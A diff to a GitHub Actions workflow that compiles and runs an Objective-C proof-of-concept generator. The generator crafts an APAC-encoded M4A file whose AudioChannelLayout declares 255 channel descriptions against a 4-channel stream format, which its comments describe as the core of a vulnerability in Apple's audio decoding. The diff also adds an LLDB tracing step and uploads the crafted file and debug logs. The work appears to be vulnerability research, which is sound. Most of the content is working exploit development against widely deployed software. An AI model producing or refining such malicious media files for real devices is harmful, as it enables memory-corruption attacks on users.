@@ -28,6 +28,7 @@ jobs:
           #import <Foundation/Foundation.h>
           #import <AudioToolbox/AudioToolbox.h>
           #include <string.h>
+          #include <stdlib.h>
 
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
@@ -42,22 +43,9 @@ jobs:
                   // Define the audio format for APAC (Apple Positional Audio Codec)
                   AudioStreamBasicDescription asbd = {0};
                   asbd.mSampleRate = 48000;
-                  asbd.mFormatID = kAudioFormatMPEG4AAC_HE; // APAC is often based on HE-AAC
-                  asbd.mFormatFlags = kAudioFormatFlagIsBigEndian; // Typical for APAC
+                  asbd.mFormatID = 'apac'; // Use the specific APAC format ID
                   asbd.mFramesPerPacket = 1024;
-                  asbd.mChannelsPerFrame = 4; // HOA often uses 4+ channels
-
-                  // PoC: Create a malicious AudioChannelLayout
-                  // The vulnerability lies in the lower two bytes of mChannelLayoutTag,
-                  // which determines the size of mRemappingArray.
-                  // We'll use a large value to create an oversized array.
-                  AudioChannelLayout maliciousLayout = {0};
-                  maliciousLayout.mChannelLayoutTag = kAudioChannelLayoutTag_UseChannelDescriptions;
-                  
-                  // This is the core of the exploit: a custom layout tag that implies
-                  // a large number of channels, causing a mismatch later.
-                  // Let's set a tag that implies a large remapping array.
-                  maliciousLayout.mChannelLayoutTag = 0x010100FF; // Custom, malicious tag
+                  asbd.mChannelsPerFrame = 4; // Lie: Claim there are only 4 channels here.
 
                   AudioFileID audioFile;
                   OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
@@ -66,13 +54,28 @@ jobs:
                       return 1;
                   }
 
+                  // PoC: Create a malicious AudioChannelLayout with a mismatched number of descriptions.
+                  // This is the core of the vulnerability.
+                  size_t layoutSize = sizeof(AudioChannelLayout) + 255 * sizeof(AudioChannelDescription);
+                  AudioChannelLayout *maliciousLayout = (AudioChannelLayout*)calloc(1, layoutSize);
+                  maliciousLayout->mChannelLayoutTag = kAudioChannelLayoutTag_UseChannelDescriptions;
+                  maliciousLayout->mNumberChannelDescriptions = 255; // The real lie: Claim there are 255 channels here.
+                  
+                  // Populate with dummy descriptions
+                  for (int i = 0; i < 255; i++) {
+                      maliciousLayout->mChannelDescriptions[i].mChannelLabel = kAudioChannelLabel_Mono;
+                  }
+
                   // Set the malicious channel layout on the file. This is where the vulnerability is seeded.
-                  status = AudioFileSetProperty(audioFile, kAudioFilePropertyChannelLayout, sizeof(maliciousLayout), &maliciousLayout);
+                  status = AudioFileSetProperty(audioFile, kAudioFilePropertyChannelLayout, layoutSize, maliciousLayout);
                   if (status != noErr) {
                       fprintf(stderr, "AudioFileSetProperty (ChannelLayout) failed: %d\n", status);
                       AudioFileClose(audioFile);
+                      free(maliciousLayout);
                       return 1;
                   }
+                  
+                  free(maliciousLayout);
 
                   // Write a small amount of dummy packet data to make the file valid enough to pass initial checks.
                   UInt32 numPacketsToWrite = 1;
@@ -85,7 +88,7 @@ jobs:
                   AudioFileClose(audioFile);
                   CFRelease(fileURL);
 
-                  fprintf(stderr, "PoC: Wrote an APAC file with a malicious channel layout tag.\n");
+                  fprintf(stderr, "PoC: Wrote an APAC file with a mismatched channel layout.\n");
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -107,7 +110,35 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # Run and Verify File Generation
+      # New: Debug the generator itself to see why the property is rejected.
+      - name: Debug APAC File Generation
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          GENERATOR_LOG_FILE="generator_debug_log.txt"
+          echo "--- Debugging APAC File Generation Process ---" > $GENERATOR_LOG_FILE
+          echo "Timestamp: $(date)" >> $GENERATOR_LOG_FILE
+
+          echo "Creating LLDB script to trace AudioFileSetProperty..." > $GENERATOR_LOG_FILE
+          cat > generator_debug_script.lldb << 'EOF'
+          # Set a breakpoint just before the call that is failing
+          breakpoint set --file encodeme.mm --line 53
+          run
+          # Now that we've hit the breakpoint, step into the function call
+          # to see where in the framework the validation is happening.
+          thread step-in
+          # Get a backtrace from inside the framework function.
+          bt
+          continue
+          quit
+          EOF
+          
+          echo "Launching encodeme_debug under LLDB to trace the failing API call..." >> $GENERATOR_LOG_FILE
+          lldb -s generator_debug_script.lldb -- ./encodeme_debug >> $GENERATOR_LOG_FILE 2>&1 || true
+
+          echo "✅ Generator debug log created. Displaying contents:"
+          cat $GENERATOR_LOG_FILE
+
+      # Run and Verify File Generation (will likely fail, but we capture the log above)
       - name: Run and Verify File Generation
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
@@ -138,13 +169,14 @@ jobs:
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
 
-      # Upload all artifacts: the invalid M4A and the player debug log
+      # Upload all artifacts: the invalid M4A and both debug logs
       - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: audio-and-debug-artifacts
           path: |
             AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
+            AppleTest/apple-positional-audio-codec-invalid-header-main/generator_debug_log.txt
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
